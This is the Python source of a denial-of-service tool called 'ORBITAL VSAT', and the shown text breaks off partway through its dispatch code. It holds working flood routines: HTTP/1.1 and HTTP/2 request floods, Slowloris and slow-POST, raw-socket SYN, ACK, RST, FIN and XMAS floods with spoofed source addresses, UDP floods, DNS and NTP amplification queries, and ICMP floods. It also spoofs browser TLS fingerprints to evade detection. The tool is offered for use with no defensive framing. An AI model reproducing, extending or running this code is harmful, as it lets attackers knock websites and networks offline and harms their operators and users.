#!/usr/bin/python

# TOM7 ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY a.k.a ORBITAL VSAT
# Author: TOM7
# GitHub: @tom7voldemort | https://github.com/tom7voldemort
# Release: November 25th, 2025
# Version: VSAT7.0
# All Layers [ 3 | 4 | 7 ] + HTTP/2 + HTTP/3 + JA3 Spoof + Multi Methods

try:
    import multiprocessing as mp
    import os
    import random
    import socket
    import ssl
    import struct
    import sys
    import threading
    import time
    from concurrent.futures import ThreadPoolExecutor
    from datetime import datetime
    from sys import stdout
    from time import sleep
    from urllib.parse import urlencode, urlparse

    from colorama import Back, Fore, init

    # HTTP/2
    try:
        import h2.config
        import h2.connection

        HAS_H2 = True
    except ImportError:
        HAS_H2 = False

    # HTTP/3
    try:
        import asyncio

        from aioquic.asyncio.client import connect
        from aioquic.h3.connection import H3_ALPN
        from aioquic.quic.configuration import QuicConfiguration

        HAS_H3 = True
    except ImportError:
        HAS_H3 = False

except ModuleNotFoundError as e:
    print(
        f"{Fore.YELLOW}[{Fore.RED} WARNING {Fore.YELLOW}]: {Fore.RED} MODULE NOT INSTALLED {Fore.GREEN} {e} {Fore.RESET}"
    )
    sys.exit(1)

init(autoreset=True)


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def animx(text):
    for c in text:
        stdout.write(c)
        stdout.flush()
        sleep(0.0002)
    print()


now = datetime.now()

banner = f"""
    {Fore.RED}
    {Back.BLACK}
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //                                                                                                                                                        //
        //     ███████    ███████████   ███████████  █████ ███████████   █████████   █████          █████   █████     █████████       █████████      ███████████  //
        //   ███░░░░░███ ░░███░░░░░███ ░░███░░░░░███░░███ ░█░░░███░░░█  ███░░░░░███ ░░███          ░░███   ░░███     ███░░░░░███     ███░░░░░███    ░█░░░███░░░█  //
        //  ███     ░░███ ░███    ░███  ░███    ░███ ░███ ░   ░███  ░  ░███    ░███  ░███           ░███    ░███    ░███    ░░░     ░███    ░███    ░   ░███  ░   //
        // ░███      ░███ ░██████████   ░██████████  ░███     ░███     ░███████████  ░███           ░███    ░███    ░░█████████     ░███████████        ░███      //
        // ░███      ░███ ░███░░░░░███  ░███░░░░░███ ░███     ░███     ░███░░░░░███  ░███           ░░███   ███      ░░░░░░░░███    ░███░░░░░███        ░███      //
        // ░░███     ███  ░███    ░███  ░███    ░███ ░███     ░███     ░███    ░███  ░███      █     ░░░█████░       ███    ░███    ░███    ░███        ░███      //
        //  ░░░███████░   █████   █████ ███████████  █████    █████    █████   █████ ███████████       ░░███      ██░░█████████  ██ █████   █████ ██    █████     //
        //    ░░░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░  ░░░░░    ░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░         ░░░      ░░  ░░░░░░░░░  ░░ ░░░░░   ░░░░░ ░░    ░░░░░      //
        //                                                             ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY                                                    //
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    {Back.RESET}

    {Fore.GREEN} TOM7 ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY

    {Fore.YELLOW}[{Fore.RED}I{Fore.YELLOW}] {Fore.MAGENTA} INFORMATIONS:
        {Fore.GREEN} Author           \t: {Fore.WHITE} TOM7
        {Fore.GREEN} GitHub           \t: {Fore.WHITE} @tom7voldemort | https://github.com/tom7voldemort
        {Fore.GREEN} Version          \t: {Fore.WHITE} VSAT.6.0
        {Fore.GREEN} Release          \t: {Fore.WHITE} NOV 30 2025
        {Fore.GREEN} Today            \t: {Fore.WHITE} {now.strftime("%Y-%m-%d %H:%M:%S")}

        {Fore.GREEN} HTTP/2           \t: {Fore.WHITE} {"✓ Enabled" if HAS_H2 else "✗ Install h2"}
        {Fore.GREEN} HTTP/3           \t: {Fore.WHITE} {"✓ Enabled" if HAS_H3 else "✗ Install aioquic"}
        {Fore.GREEN} Methods          \t: {Fore.WHITE} 50+ Attack Vectors
        {Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TYPE 'helper' TO SEE TOOLS HELP.
    {Fore.RESET}
"""

helper = f"""
    {Fore.YELLOW}[{Fore.RED}M{Fore.YELLOW}]: {Fore.CYAN} Available Methods:
        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.MAGENTA} LAYER 7: {Fore.WHITE} APPLICATION
            {Fore.MAGENTA}     ->{Fore.WHITE} GET                   \t: {Fore.GREEN} HTTP GET Flood With Cache Bypass
            {Fore.MAGENTA}     ->{Fore.WHITE} POST                  \t: {Fore.GREEN} HTTP POST Flood [ 64KB Payloads ]
            {Fore.MAGENTA}     ->{Fore.WHITE} PUT                   \t: {Fore.GREEN} HTTP PUT Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} HEAD                  \t: {Fore.GREEN} HTTP HEAD Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} DELETE                   \t: {Fore.GREEN} HTTP DELETE Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} PATCH                 \t: {Fore.GREEN} HTTP PATCH Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} OPTIONS                   \t: {Fore.GREEN} HTTP OPTIONS Flood

        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 7: {Fore.WHITE} ADVANCED METHODS
            {Fore.MAGENTA}     ->{Fore.WHITE} XMLRPC                    \t: {Fore.GREEN} XML-RPC Pingback attack
            {Fore.MAGENTA}     ->{Fore.WHITE} RANDOM                    \t: {Fore.GREEN} Random HTTP Methods Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} SLOWLORIS                 \t: {Fore.GREEN} Slowloris Attack [ Keep Alive ]
            {Fore.MAGENTA}     ->{Fore.WHITE} SLOW-POST                 \t: {Fore.GREEN} Slow-POST Body Attack
            {Fore.MAGENTA}     ->{Fore.WHITE} CACHE                 \t: {Fore.GREEN} Cache Bypass Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} BYPASS                    \t: {Fore.GREEN} WAF Bypass Techniques
            {Fore.MAGENTA}     ->{Fore.WHITE} CONNECT                   \t: {Fore.GREEN} HTTP CONNECT Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} TRACE                 \t: {Fore.GREEN} HTTP TRACE Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} SLOW-READ                 \t: {Fore.GREEN} Slow-READ Body Attack
            {Fore.MAGENTA}     ->{Fore.WHITE} RUDY                  \t: {Fore.GREEN} ARE-YOU-DEAD-YET Attack

        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 7: {Fore.WHITE} HTTP/2 | HTTP/3
            {Fore.MAGENTA}     ->{Fore.WHITE} H2-GET                    \t: {Fore.GREEN} HTTP/2 GET With Priority
            {Fore.MAGENTA}     ->{Fore.WHITE} H2-POST                   \t: {Fore.GREEN} HTTP/2 POST With Multiplexing
            {Fore.MAGENTA}     ->{Fore.WHITE} H2-RAPID                  \t: {Fore.GREEN} HTTP/2 RAPID Reset
            {Fore.MAGENTA}     ->{Fore.WHITE} H2-PING                   \t: {Fore.GREEN} HTTP/2 PING Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} H3-GET                    \t: {Fore.GREEN} HTTP/3 QUIC GET
            {Fore.MAGENTA}     ->{Fore.WHITE} H3-POST                   \t: {Fore.GREEN} HTTP/3 QUIC POST

        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 4: {Fore.WHITE} TRANSPORT
            {Fore.MAGENTA}     ->{Fore.WHITE} TCP                   \t: {Fore.GREEN} TCP Connection Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} UDP                   \t: {Fore.GREEN} UDP Packet Flood [ 64KB Payloads ]
            {Fore.MAGENTA}     ->{Fore.WHITE} SYN                   \t: {Fore.GREEN} TCP SYN Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
            {Fore.MAGENTA}     ->{Fore.WHITE} ACK                   \t: {Fore.GREEN} TCP ACK Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
            {Fore.MAGENTA}     ->{Fore.WHITE} RST                   \t: {Fore.GREEN} TCP RST Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
            {Fore.MAGENTA}     ->{Fore.WHITE} FIN                   \t: {Fore.GREEN} TCP FIN Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
            {Fore.MAGENTA}     ->{Fore.WHITE} SYNACK                    \t: {Fore.GREEN} TCP SYN-ACK Reflection
            {Fore.MAGENTA}     ->{Fore.WHITE} PSH                   \t: {Fore.GREEN} TCP PSH + ACK Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} URG                   \t: {Fore.GREEN} TCP URG Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} XMAS                  \t: {Fore.GREEN} TCP XMAS SCAN Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} NULL                  \t: {Fore.GREEN} TCP NULL SCAN Flood

        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 4: {Fore.WHITE} AMPLIFICATIONS
            {Fore.MAGENTA}     ->{Fore.WHITE} UDP-FRAG                  \t: {Fore.GREEN} UDP FRAGMENTATION Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} DNS-AMP                   \t: {Fore.GREEN} DNS AMPLIFICATION
            {Fore.MAGENTA}     ->{Fore.WHITE} NTP-AMP                   \t: {Fore.GREEN} NTP AMPLIFICATION
            {Fore.MAGENTA}     ->{Fore.WHITE} SSDP-AMP                  \t: {Fore.GREEN} SSDP AMPLIFICATION
            {Fore.MAGENTA}     ->{Fore.WHITE} MEMCACHED                 \t: {Fore.GREEN} MEMCACHED AMPLIFICATION
            {Fore.MAGENTA}     ->{Fore.WHITE} CHARGEN                   \t: {Fore.GREEN} CHARGEN AMPLIFICATION

        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 3: {Fore.WHITE} NETWORKS
            {Fore.MAGENTA}     ->{Fore.WHITE} ICMP                  \t: {Fore.GREEN} ICMP Ping Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
            {Fore.MAGENTA}     ->{Fore.WHITE} PING                  \t: {Fore.GREEN} PING Flood
            {Fore.MAGENTA}     ->{Fore.WHITE} SMURF                 \t: {Fore.GREEN} SMURF Attack
            {Fore.MAGENTA}     ->{Fore.WHITE} FRAGGLE                   \t: {Fore.GREEN} FRAGGLE Attack [ UDP + ECHO ]

    {Fore.YELLOW}[{Fore.RED}C{Fore.YELLOW}]: {Fore.CYAN} Configuration Supports:
            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} User-Agent Headers Randomization
            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Proxy Address Randomization/Proxychaining
            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Referers Randomization/Requests Sources Randomization
            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} HTTP1 | HTTP2 | HTTP3 Configurations Support
            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Autofingerprinting JA3, TLS, Browser Like Requests [ chrome | firefox | safari ]

    {Fore.YELLOW}[{Fore.RED}EXIT{Fore.YELLOW}]: {Fore.RED} CTRL + C To Stop.

{Fore.RESET}
"""

# JA3 Profiles
JA3Profiles = {
    "chrome": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xC02C,
            0xC030,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
    "firefox": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02B,
            0xC02F,
            0xCCA9,
            0xCCA8,
            0xC02C,
            0xC030,
        ],
        "curves": [29, 23, 24, 25],
    },
    "safari": {
        "ciphers": [
            0x1301,
            0x1302,
            0x1303,
            0xC02C,
            0xC02B,
            0xC030,
            0xC02F,
            0xCCA9,
            0xCCA8,
        ],
        "curves": [29, 23, 24],
    },
}


class OrbitalVSAT:
    def __init__(self):
        self.target = None
        self.method = "POST"
        self.threads = 500
        self.duration = 60
        self.protocol = "h1"
        self.clusterMode = False
        self.processes = mp.cpu_count()
        self.ja3profile = "chrome"
        self.running = mp.Value("i", 0)
        self.requestsCount = mp.Value("i", 0)
        self.bytesSent = mp.Value("i", 0)
        self.statsLock = mp.Lock()
        self.default_ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
        ]

    def docloader(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    return [
                        l.strip() for l in f if l.strip() and not l.startswith("#")
                    ] or default
            except Exception:
                pass
        return default

    def randstr(self, length=10):
        return "".join(
            random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length)
        )

    def randip(self):
        return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def setup(self):
        if not self.target.startswith(("http://", "https://")):
            self.target = "https://" + self.target
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.path = parsed.path or "/"
        self.port = parsed.port or (443 if self.scheme == "https" else 80)
        if "UDP" in self.method.upper():
            self.port = 53
        if "NTP" in self.method.upper():
            self.port = 123
        try:
            self.ip = socket.gethostbyname(self.host)
        except Exception:
            animx(
                f"{Fore.YELLOW}[{Fore.RED} ERROR {Fore.YELLOW}]: {Fore.MAGENTA} CANNOT RESOLVE: {Fore.RED} {self.host} {Fore.RESET}"
            )
            raise
        self.useragents = self.docloader("UA.txt", self.default_ua)
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TARGET: {Fore.MAGENTA} {self.target} {Fore.RESET}"
        )
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} IP ADDRESS: {Fore.MAGENTA} {self.ip}:{self.port} {Fore.RESET}"
        )
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} METHODS: {Fore.MAGENTA} {self.method} {Fore.RESET}"
        )
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} PROTOCOL: {Fore.MAGENTA} {self.protocol.upper()} {Fore.RESET}"
        )
        animx(
            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} JA3 Fingerprint: {Fore.MAGENTA} {self.ja3profile} {Fore.RESET}"
        )

        if self.clusterMode:
            animx(
                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} CLUSTER: {Fore.MAGENTA} {self.processes} {Fore.BLUE} CORES x: {Fore.MAGENTA} {self.processes * self.threads} {Fore.GREEN} THREADS. {Fore.RESET}"
            )

    def getCipherNames(self, cipher_codes):
        cipher_map = {
            0x1301: "TLS_AES_128_GCM_SHA256",
            0x1302: "TLS_AES_256_GCM_SHA384",
            0x1303: "TLS_CHACHA20_POLY1305_SHA256",
            0xC02B: "ECDHE-ECDSA-AES128-GCM-SHA256",
            0xC02F: "ECDHE-RSA-AES128-GCM-SHA256",
            0xC02C: "ECDHE-ECDSA-AES256-GCM-SHA384",
            0xC030: "ECDHE-RSA-AES256-GCM-SHA384",
            0xCCA9: "ECDHE-ECDSA-CHACHA20-POLY1305",
            0xCCA8: "ECDHE-RSA-CHACHA20-POLY1305",
        }
        return [cipher_map.get(c, "") for c in cipher_codes[:8] if c in cipher_map] or [
            "ECDHE+AESGCM"
        ]

    def createJa3Socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            if self.scheme == "https":
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                profile = JA3Profiles[self.ja3profile]
                cipherNames = self.getCipherNames(profile["ciphers"])
                try:
                    context.set_ciphers(":".join(cipherNames))
                except Exception:
                    context.set_ciphers("ECDHE+AESGCM:!aNULL")
                if self.protocol == "h2":
                    context.set_alpn_protocols(["h2", "http/1.1"])
                elif self.protocol == "h3":
                    context.set_alpn_protocols(["h3"])
                else:
                    context.set_alpn_protocols(["http/1.1"])
                sock = context.wrap_socket(sock, server_hostname=self.host)
            return sock
        except Exception:
            return None

    # LAYER 7 HTTP METHODS

    def httpExecutor(self, executorId):
        """HTTP/1.1 Worker For All HTTP Methods"""
        localCount = 0
        localBytes = 0
        httpMethods = {
            "GET": "GET",
            "POST": "POST",
            "PUT": "PUT",
            "HEAD": "HEAD",
            "DELETE": "DELETE",
            "PATCH": "PATCH",
            "OPTIONS": "OPTIONS",
            "CONNECT": "CONNECT",
            "TRACE": "TRACE",
        }
        while self.running.value:
            sock = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                for _ in range(500):
                    if not self.running.value:
                        break
                    try:
                        if self.method == "RANDOM":
                            httpMethods = random.choice(list(httpMethods.values()))
                        else:
                            httpMethods = httpMethods.get(self.method, "GET")
                        ua = random.choice(self.useragents)
                        path = f"{self.path}?_={int(time.time() * 1000000)}&{self.randstr(8)}"
                        request = f"{httpMethods} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {ua}\r\n"
                        request += f"Accept: */*\r\n"
                        request += f"X-Forwarded-For: {self.randip()}\r\n"
                        request += f"Connection: keep-alive\r\n"
                        if httpMethods in ["POST", "PUT", "PATCH"]:
                            body = ("X" * 65536).encode()
                            request += f"Content-Length: {len(body)}\r\n\r\n"
                            payload = request.encode() + body
                        else:
                            request += "\r\n"
                            payload = request.encode()
                        sock.sendall(payload)
                        localCount += 1
                        localBytes += len(payload)
                        try:
                            sock.settimeout(0.0001)
                            sock.recv(16384)
                        except Exception:
                            pass
                    except Exception:
                        break
                if localCount > 0:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def slowlorisExecutor(self, executorId):
        """Slowloris Attack"""
        connections = []
        for _ in range(200):
            try:
                sock = self.createJa3Socket()
                if sock:
                    sock.sendall(
                        f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode()
                    )
                    connections.append(sock)
            except Exception:
                pass
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(
                        f"X-{self.randstr(5)}: {self.randstr(10)}\r\n".encode()
                    )
                    with self.statsLock:
                        self.requestsCount.value += 1
                except Exception:
                    connections.remove(sock)
            sleep(10)

    def slow_postExecutor(self, executorId):
        """Slow POST Attack"""
        connections = []
        for _ in range(100):
            try:
                sock = self.createJa3Socket()
                if sock:
                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 999999999\r\n\r\n"
                    sock.sendall(req.encode())
                    connections.append(sock)
            except Exception:
                pass
        while self.running.value:
            for sock in connections[:]:
                try:
                    sock.sendall(self.randstr(1).encode())
                except Exception:
                    connections.remove(sock)
            sleep(1)

    # HTTP/2 METHODS

    def h2Executor(self, executorId):
        """HTTP/2 Worker With Priority"""
        if not HAS_H2:
            return
        localCount = 0
        localBytes = 0
        while self.running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                if self.scheme == "https" and sock.selected_alpn_protocol() != "h2":
                    sock.close()
                    continue
                config = h2.config.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                h2Connection.increment_flow_control_window(15663105)
                sock.sendall(h2Connection.data_to_send())
                for stream_id in range(1, 513, 2):
                    if not self.running.value:
                        break
                    try:
                        h2Connection.prioritize(stream_id, weight=random.randint(1, 256))
                        headers = [
                            (":method", "POST" if "POST" in self.method else "GET"),
                            (":scheme", self.scheme),
                            (":authority", self.host),
                            (
                                ":path",
                                f"{self.path}?s={stream_id}&_{int(time.time() * 1000000)}",
                            ),
                            ("user-agent", random.choice(self.useragents)),
                        ]
                        h2Connection.send_headers(stream_id, headers)
                        if "POST" in self.method:
                            body = os.urandom(65536)
                            h2Connection.send_data(stream_id, body)
                            localBytes += len(body)
                        h2Connection.end_stream(stream_id)
                        if stream_id % 32 == 1:
                            data = h2Connection.data_to_send()
                            if data:
                                sock.sendall(data)
                                localBytes += len(data)
                        localCount += 1
                    except Exception:
                        break
                if localCount > 0:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass
            finally:
                if h2Connection:
                    try:
                        h2Connection.close_connection()
                    except Exception:
                        pass
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def h2_pingExecutor(self, executorId):
        """HTTP/2 PING Flood"""
        if not HAS_H2:
            return

        while self.running.value:
            sock = None
            h2Connection = None
            try:
                sock = self.createJa3Socket()
                if not sock:
                    continue
                config = h2.config.H2Configuration(client_side=True)
                h2Connection = h2.connection.H2Connection(config=config)
                h2Connection.initiate_connection()
                sock.sendall(h2Connection.data_to_send())
                for _ in range(1000):
                    if not self.running.value:
                        break
                    try:
                        h2Connection.ping(os.urandom(8))
                        data = h2Connection.data_to_send()
                        if data:
                            sock.sendall(data)
                        with self.statsLock:
                            self.requestsCount.value += 1
                    except Exception:
                        break
            except Exception:
                pass

    # LAYER 4 TCP METHODS

    def tcpExecutor(self, executorId):
        """TCP Connection Flood"""
        localCount = 0
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.ip, self.port))
                sock.sendall(os.urandom(2048))
                localCount += 1
                if localCount >= 100:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                    localCount = 0
                sock.close()
            except Exception:
                pass

    def synExecutor(self, executorId):
        """SYN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                src_ip = self.randip()
                ip_h = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.ip),
                )
                tcp_h = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    2,
                    8192,
                    0,
                    0,
                )
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def ackExecutor(self, executorId):
        """ACK Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                src_ip = self.randip()
                ip_h = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.ip),
                )
                tcp_h = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    16,
                    8192,
                    0,
                    0,
                )
                sock.sendto(ip_h + tcp_h, (self.ip, 0))

                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def rstExecutor(self, executorId):
        """RST Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                src_ip = self.randip()
                ip_h = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.ip),
                )
                tcp_h = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    4,
                    8192,
                    0,
                    0,
                )
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def finExecutor(self, executorId):
        """FIN Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                src_ip = self.randip()
                ip_h = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.ip),
                )
                tcp_h = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    1,
                    8192,
                    0,
                    0,
                )
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def xmasExecutor(self, executorId):
        """XMAS Flood (FIN+PSH+URG)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            return
        while self.running.value:
            try:
                src_ip = self.randip()
                ip_h = struct.pack(
                    "!BBHHHBBH4s4s",
                    69,
                    0,
                    40,
                    random.randint(1, 65535),
                    0,
                    64,
                    socket.IPPROTO_TCP,
                    0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.ip),
                )
                tcp_h = struct.pack(
                    "!HHLLBBHHH",
                    random.randint(1024, 65535),
                    self.port,
                    0,
                    0,
                    80,
                    41,
                    8192,
                    0,
                    0,
                )
                sock.sendto(ip_h + tcp_h, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    # LAYER 4 UDP METHODS

    def udpExecutor(self, executorId):
        """UDP Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        localCount = 0
        localBytes = 0
        while self.running.value:
            try:
                data = os.urandom(65507)
                sock.sendto(data, (self.ip, self.port))
                localCount += 1
                localBytes += len(data)
                if localCount >= 500:
                    with self.statsLock:
                        self.requestsCount.value += localCount
                        self.bytesSent.value += localBytes
                    localCount = 0
                    localBytes = 0
            except Exception:
                pass

    def udp_fragExecutor(self, executorId):
        """UDP Fragmentation Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self.running.value:
            try:
                for i in range(10):
                    frag = os.urandom(8192)
                    sock.sendto(frag, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 10
            except Exception:
                pass

    def dns_ampExecutor(self, executorId):
        """DNS Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dnsQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        dnsQuery += b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
        while self.running.value:
            try:
                sock.sendto(dnsQuery, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    def ntp_ampExecutor(self, executorId):
        """NTP Amplification"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_query = b"\x17\x00\x03\x2a" + b"\x00" * 4
        while self.running.value:
            try:
                sock.sendto(ntp_query, (self.ip, self.port))
                with self.statsLock:
                    self.requestsCount.value += 1
            except Exception:
                pass

    # LAYER 3 ICMP METHODS

    def icmpExecutor(self, executorId):
        """ICMP Flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return
        while self.running.value:
            try:
                packetId = random.randint(1, 65535)
                header = struct.pack("!BBHHH", 8, 0, 0, packetId, 1)
                data = os.urandom(2048)
                checksum = self.calculateChecksum(header + data)
                header = struct.pack(
                    "!BBHHH", 8, 0, socket.htons(checksum), packetId, 1
                )
                sock.sendto(header + data, (self.ip, 0))
                with self.statsLock:
                    self.requestsCount.value += 1
                    self.bytesSent.value += len(header + data)
            except Exception:
                pass

    def calculateChecksum(self, data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i] << 8
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    # CLUSTER & STATS

    def cluster_process(self, process_id):
        """Cluster Process"""
        methodOptions = {
            "GET": self.httpExecutor,
            "POST": self.httpExecutor,
            "PUT": self.httpExecutor,
            "HEAD": self.httpExecutor,
            "DELETE": self.httpExecutor,
            "PATCH": self.httpExecutor,
            "OPTIONS": self.httpExecutor,
            "CONNECT": self.httpExecutor,
